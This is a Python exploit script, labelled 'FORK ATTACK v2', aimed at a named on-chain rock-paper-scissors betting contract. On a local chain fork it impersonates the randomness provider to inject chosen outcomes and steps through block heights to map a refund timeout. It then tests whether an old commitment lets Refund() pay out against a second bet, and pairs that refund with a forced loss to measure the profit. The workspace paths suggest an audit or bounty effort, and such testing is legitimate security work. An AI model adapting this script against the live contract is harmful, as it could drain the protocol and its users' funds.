#!/usr/bin/env python3
"""nar.bet — FORK ATTACK v2: map the refund clock, then test commitment reuse.

v1 findings that shape v2 (all from the fork, not from reading):
  * `Refund()` on a freshly-played game reverts `RefundTooEarly(uint256,uint256)` —
    NOT NotAwaitingVRF. So the "wait" is checked before the pending-request gate, and
    it still fired 29 blocks after the bet. The clock's origin is unknown -> decode it.
  * `GetState(player)` = [wager, sequence, ?, block, awaitingFlag, ?] — word1 is the
    sequence. v1 used word0 and its callbacks were silent no-ops (tx succeeded, state
    unchanged) -> the callback DOES effectively validate the sequence.
  * A second bet while one is pending reverts (status 0x0).

v2 therefore, in order:
  1. bet -> walk the block height forward, decoding RefundTooEarly(have,want) at each
     step, until the revert changes. This yields the clock's origin and length.
  2. settle the request with the CORRECT sequence and confirm a refund is then refused.
  3. place a second bet and re-probe: if the mature commitment from bet #1 is reused,
     the "too early" revert disappears and the refund succeeds against bet #2.

All writes go to the local fork only (127.0.0.1:8555).
Output: fork/refund-attack-v2.json
"""
import json, os, time, urllib.request
from eth_abi import encode, decode as abi_decode
from eth_utils import keccak

RPC = "http://127.0.0.1:8555"
OUT = os.path.expanduser("~/.hermes/workspace/SAVAGEAUD/TARGETS/narbet/fork")
BASE = os.path.expanduser("~/.hermes/workspace/SAVAGEAUD/TARGETS/narbet")

RPS = "0x843d62ad75f5d0b383f8520e23d19174b7961b8e"
ENTROPY = "0xd458261e832415cfd3bae5e416fdf3230ce6f134"
PROVIDER = "0x52deaa1c84233f7bb8c8a45baede41091c616506"
NATIVE = "0x0000000000000000000000000000000000000000"
ACCT0 = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"

SEL_PLAY, SEL_REFUND, SEL_STATE, SEL_CB, SEL_FEE = \
    "0x493e7930", "0x0f0aa179", "0xcfea2f6f", "0x52a5f1f8", "0x5768c29a"

ABI = json.load(open(os.path.join(BASE, "recon", "abi-real.json")))
ERRORS = {}
for n, s in ABI["errors"].items():
    ins = (s.get("inputs") or "")
    parts, depth, cur = [], 0, ""
    for ch in ins:
        if ch in "([":
            depth += 1
        elif ch in ")]":
            depth -= 1
        if ch == "," and depth == 0:
            parts.append(cur.strip()); cur = ""
        else:
            cur += ch
    if cur.strip():
        parts.append(cur.strip())
    types = []
    skip = False
    for p in parts:
        t = p.split()[0] if p.split() else p
        if t.startswith("tuple"):
            skip = True
            break
        types.append(t)
    if skip:
        continue
    ERRORS["0x" + keccak(text=f"{n}({','.join(types)})")[:4].hex()] = types

_id = [0]
def rpc(method, params, timeout=60):
    _id[0] += 1
    try:
        d = json.loads(urllib.request.urlopen(urllib.request.Request(
            RPC, data=json.dumps({"jsonrpc": "2.0", "id": _id[0], "method": method,
                                  "params": params}).encode(),
            headers={"Content-Type": "application/json"}), timeout=timeout).read())
    except Exception as e:
        return {"exc": str(e)[:150]}
    return d["error"] if "error" in d else d.get("result")


def call(to, data, frm=ACCT0, value=0):
    return rpc("eth_call", [{"from": frm, "to": to, "data": data, "value": hex(value)}, "latest"])


def send(to, data, frm, value=0):
    h = rpc("eth_sendTransaction", [{"from": frm, "to": to, "data": data, "value": hex(value)}])
    return (None, h["error"]) if isinstance(h, dict) and h.get("error") else (h, None)


def receipt(h):
    for _ in range(40):
        r = rpc("eth_getTransactionReceipt", [h])
        if r:
            return r
        time.sleep(0.25)
    return None


def bal(a):
    return int(rpc("eth_getBalance", [a, "latest"]), 16)


def blk():
    return int(rpc("eth_blockNumber", []), 16)


def mine(n=1):
    rpc("anvil_mine", [hex(n), "0x0"])


def decode_err(res):
    """-> ('Name', [args]) or ('OK', []).

    NOTE: rpc() already unwrapped the JSON-RPC envelope, so a revert arrives here as
    the bare error object {code,message,data}. An earlier version of this function
    only looked for a nested res["error"] key and therefore reported EVERY revert as
    "OK" -- a silent-wrong detector that produced a fully bogus timeline. Handle both
    shapes explicitly.
    """
    if isinstance(res, dict) and ("code" in res or "message" in res):
        e = res
    elif isinstance(res, dict) and res.get("error"):
        e = res["error"]
    else:
        return ("OK", [])
    data = e.get("data") if isinstance(e, dict) else ""
    if isinstance(data, dict):
        data = data.get("data", "")
    if not data or data == "0x" or len(data) < 10:
        return ("EMPTY_REVERT", [])
    sel = data[:10]
    types = ERRORS.get(sel)
    name = f"unknown{sel}"
    args = []
    for n, s in ABI["errors"].items():
        ins = (s.get("inputs") or "")
        parts, depth, cur = [], 0, ""
        for ch in ins:
            if ch in "([":
                depth += 1
            elif ch in ")]":
                depth -= 1
            if ch == "," and depth == 0:
                parts.append(cur.strip()); cur = ""
            else:
                cur += ch
        if cur.strip():
            parts.append(cur.strip())
        tt = []
        ok = True
        for p in parts:
            t = p.split()[0] if p.split() else p
            if t.startswith("tuple"):
                ok = False
                break
            tt.append(t)
        if not ok:
            continue
        if "0x" + keccak(text=f"{n}({','.join(tt)})")[:4].hex() == sel:
            name = n
            if tt:
                try:
                    args = list(abi_decode(tt, bytes.fromhex(data[10:])))
                except Exception:
                    args = []
            break
    return (name, args)


def state(player):
    r = call(RPS, SEL_STATE + "0" * 24 + player[2:].lower())
    if isinstance(r, dict):
        return r
    w = r[2:]
    return [int(w[i:i + 64], 16) for i in range(0, len(w), 64)]


def play(player, wager, num_bets=1, action=0):
    fee = int(rpc("eth_call", [{"to": RPS, "data": SEL_FEE}, "latest"]), 16)
    data = SEL_PLAY + encode(["uint256", "address", "uint8", "uint32"],
                             [wager, NATIVE, action, num_bets]).hex()
    h, e = send(RPS, data, player, value=wager * num_bets + fee)
    return h, e, receipt(h) if h else None, fee


def deliver(seq, rnd_hex):
    rpc("anvil_impersonateAccount", [ENTROPY])
    rpc("anvil_setBalance", [ENTROPY, hex(10 ** 19)])
    data = SEL_CB + encode(["uint64", "address", "bytes32"],
                           [seq, PROVIDER, bytes.fromhex(rnd_hex[2:])]).hex()
    h, e = send(RPS, data, ENTROPY)
    return h, e, receipt(h) if h else None


def refund_probe(who=ACCT0):
    return decode_err(call(RPS, SEL_REFUND, frm=who))


def main():
    out = {"start_block": blk()}
    wager = 10 ** 18
    print("fork block", blk())

    # ---------- 1. bet, then walk the clock ----------
    h, e, rc, fee = play(ACCT0, wager)
    print(f"\n[1] bet A tx={h} err={e} status={rc and rc['status']} blk={rc and int(rc['blockNumber'],16)}")
    bet_blk = int(rc["blockNumber"], 16)
    st = state(ACCT0)
    print("    GetState:", st)
    seq = st[1]
    print("    wager=%s sequence=%s awaiting=%s settleBlockField=%s" % (st[0] / 1e18, st[1], st[4], st[3]))

    timeline = []
    print("\n[2] refund timeline (each row = eth_call at that height):")
    for gap in [0, 5, 10, 15, 19, 20, 21, 25, 30, 40]:
        while blk() < bet_blk + gap:
            mine(1)
        name, args = refund_probe()
        row = {"block": blk(), "blocks_after_bet": blk() - bet_blk,
               "revert": name, "args": args, "state": state(ACCT0)}
        timeline.append(row)
        print(f"    +{row['blocks_after_bet']:3d} blk={row['block']} -> {name} {args}")
        out.setdefault("timeline_before_settle", []).append(row)

    # ---------- 3. settle A properly ----------
    st = state(ACCT0)
    print("\n[3] settling A with CORRECT sequence", st[1])
    hc, ec, rcc = deliver(st[1], "0x" + "22" * 32)
    print("    cb tx status:", rcc and rcc["status"], ec)
    time.sleep(0.5)
    st_after = state(ACCT0)
    print("    GetState after settle:", st_after)
    name, args = refund_probe()
    print("    refund after settle ->", name, args)
    out["after_settle"] = {"state": st_after, "refund": [name, args]}

    # ---------- 4. second bet + reuse test ----------
    mine(25)
    h2, e2, rc2, fee2 = play(ACCT0, wager)
    print(f"\n[4] bet B tx={h2} err={e2} status={rc2 and rc2['status']} blk={rc2 and int(rc2['blockNumber'],16)}")
    stB = state(ACCT0)
    print("    GetState(B):", stB, " (word4 awaiting =", (stB[4] if isinstance(stB, list) else '?'), ")")
    b2 = int(rc2["blockNumber"], 16) if rc2 else None
    reuse = []
    if rc2 and rc2["status"] == "0x1":
        for gap in [0, 5, 12, 20, 21, 22, 30]:
            while blk() < b2 + gap:
                mine(1)
            name, args = refund_probe()
            row = {"block": blk(), "blocks_after_betB": blk() - b2,
                   "blocks_after_betA": blk() - bet_blk, "revert": name, "args": args}
            reuse.append(row)
            print(f"    +{row['blocks_after_betB']:3d} after B (+{row['blocks_after_betA']} after A) -> {name} {args}")
        out["reuse_probe"] = reuse
        # if the refund would succeed, execute it
        name, args = refund_probe()
        if name == "OK":
            b0 = bal(ACCT0)
            hr, er = send(RPS, SEL_REFUND, ACCT0)
            rcr = receipt(hr) if hr else None
            print("\n    *** Refund() EXECUTED against bet B:", hr, rcr and rcr["status"])
            print("    balance delta:", (bal(ACCT0) - b0) / 1e18, "MON")
            print("    logs:", [l["topics"][0][:14] for l in (rcr or {}).get("logs", [])])
            stR = state(ACCT0)
            print("    GetState after refund:", stR)
            hcb, ecb, rccb = deliver(stB[1], "0x" + "33" * 32)
            print("    deliver LOSS after refund:", rccb and rccb["status"], ecb)
            print("    FINAL balance delta:", (bal(ACCT0) - b0) / 1e18)
            out["refund_executed"] = {"tx": hr, "status": rcr and rcr["status"],
                                      "state_after": stR,
                                      "loss_after_refund_status": rccb and rccb["status"]}
        else:
            print("\n    refund against bet B refused:", name, args)
            out["refund_against_B"] = [name, args]

    json.dump(out, open(os.path.join(OUT, "refund-attack-v2.json"), "w"), indent=1)
    print("\nsaved fork/refund-attack-v2.json")


if __name__ == "__main__":
    main()
